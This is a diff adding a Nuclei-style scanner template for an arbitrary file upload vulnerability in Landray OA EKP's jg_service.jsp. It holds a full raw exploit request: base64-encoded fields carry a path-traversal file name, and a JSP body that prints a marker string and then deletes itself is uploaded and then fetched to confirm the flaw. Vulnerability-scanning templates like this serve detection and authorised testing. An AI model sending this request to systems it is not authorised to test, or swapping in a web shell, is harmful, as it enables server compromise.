@@ -1,0 +1,36 @@
+id: landray-oa-service-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 蓝凌OA EKP jg_service任意文件上传漏洞
+  reference:
+    - https://github.com/wudijun/Catcher/blob/d54daa732c892c197635c22fed1daa44586b0a86/poc/%E8%93%9D%E5%87%8CEKP/%E8%93%9D%E5%87%8COA%20EKP%20jg_service%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.yaml#L11
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /sys/attachment/sys_att_main/jg_service.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0)Gecko/20100101 Firefox/127.0
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-type: application/x-www-form-urlencoded
+        Content-Length: 374
+
+        DBSTEP V3.0    124            0              999
+        DBSTEP=REJTVEVQ
+        OPTION=U0FWRUFTSFRNTA==
+        HTMLNAME=Li4vLi4vLi4vLi4vLi4vZWtwL3Jlc291cmNlL3N0Yy5qc3A=
+        RECORDID=
+        DIRECTORY=
+
+        <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM="))); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      - |+
+        GET /resource/stc.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'e165421110ba'
